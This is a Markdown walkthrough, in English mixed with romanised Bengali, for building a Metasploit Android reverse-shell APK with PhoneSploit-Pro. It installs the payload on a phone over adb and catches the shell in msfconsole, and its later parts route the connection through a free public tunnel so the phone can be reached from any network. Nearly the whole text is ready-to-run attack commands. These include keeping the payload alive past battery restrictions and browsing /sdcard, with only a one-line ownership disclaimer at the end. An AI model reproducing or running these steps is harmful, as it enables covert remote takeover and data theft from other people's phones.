# 🚀 PhoneSploit-Pro — Self-Test & Remote Access Guide
**(Verified working 2026-08-26 — Infinix X6880, Android 15)**

## PART 1 — Quick Test (USB / same LAN)

### Step 1: Connect + verify
```bash
cd ~/geek\>div/tools-haydra/PhoneSploit-Pro
adb devices                 # serial dekhbe e.g. 131943851C004595
```

### Step 2: Build + install payload
```bash
# (first time only) venv
~/.venv/bin/python phonesploitpro.py   # app explore korar jonno (optional)

# payload build (FGS = battery-killer safe)
cd ~/geek\>div/tools-haydra/PhoneSploit-Pro
./build_payload.sh --fgs 127.0.0.1 4444 /tmp/test-me.apk

# install on phone (USB)
adb install -r /tmp/test-me.apk
adb shell pm grant com.metasploit.stage android.permission.POST_NOTIFICATIONS
```

### Step 3 — Start handler (interactive)
```bash
msfconsole -q -n -r pipeline/handler-interactive.rc
```
Wait ~5s → **`Started reverse TCP handler on 127.0.0.1:4444`**

### Step 4 — Launch payload on phone
```bash
adb reverse tcp:4444 tcp:4444
adb shell am start -n com.metasploit.stage/.MainActivity
```
→ msfconsole e `Command shell session 1 opened...`

### Step 5 — interact
```
sessions -i 1
id                        # uid...
ls /sdcard/
getprop ro.product.model
```

---

## PART 2 — INTERNET (remote access, no USB/no LAN)

### Step 1 — Start a public tunnel (Pinggy — FREE, no account)
```bash
ssh -o StrictHostKeyChecking=no -p 443 -R 0:localhost:4444 tcp@a.pinggy.io
```
Output: `tcp://RANDOM-103-xx.run.pinggy-free.link:PORT` — **eita apnar phone er LHOST/LPORT**

### Step 2 — Build REMOTE payload (point at tunnel)
```bash
TUNNEL_HOST="RANDOM-xxx.run.pinggy-free.link"   # tunner theke copy
TUNNEL_PORT="3xxxx"
./build_payload.sh --fgs $TUNNEL_HOST $TUNNEL_PORT /tmp/remote-mine.apk
```

### Step 3 — Install payload (USB/computer theke; then disconnect)
```bash
adb install -r /tmp/remote-mine.apk
adb shell am start -n com.metasploit.stage/.MainActivity
# phone take kore jao — jekono WiFi/5G e connect korlei session ashbe!
```

### Step 4 — Wait for session (local handler)
```bash
msfconsole -q -n -r pipeline/handler-interactive.rc
# → "Command shell session 1 opened... " saatle:
sessions -i 1
whoami; pwd; ls /sdcard/
```

> 💡 Tunnel ta **60 minute** ba **disconnect** hole nisi — new tunnel korle payload e oi naya host/port build korte hobe.

---

## PART 3 — 3 Phone Scale (Samsung/Stylus)

```bash
# 1st: USB connect
adb install -r /tmp/payload-mine.apk && adb shell am start ...

# 2nd: Wi-Fi adb (developer options > wireless debugging)
adb pair xx.xx.xx.xx:PORT CODE   # QR/Code
adb connect ip:5555

# 3rd: Internet
# same payload over tunnel — says GOTCHA: each phone NEEDS its OWN payload build
# (LHOST/LPORT slyge apnar current tunnel)
```

---

## ❗ Common problems → this fix

| Problem | Fix |
|---|---|
| `INSTALL_FAILED_UPDATE_INCOMPATIBLE` | `adb uninstall com.metasploit.stage` then reinstall |
| Notif prompt | `adb shell pm grant ... POST_NOTIFICATIONS` |
| No session + app gone = XOS killed | `adb shell dumpsys deviceidle whitelist +com.metasploit.stage` + app "Unrestricted" (Battery settings) |
| session dies in seconds | FGS rebuild chain (--fgs), whitelist, notification grant |
| Tunnel expires | new pinggy tunnel → **rebuild payload with new host/port** |

---

## 🤫 EXTRA (recommended)
- **Android 15** requires `targetSdk 34` — `build_payload.sh` oita dey (fixed).
- Cleartext/HTTP — still HTTPS only for SMS.
- Test only devices you OWN. Respect local laws. This is authorized testing.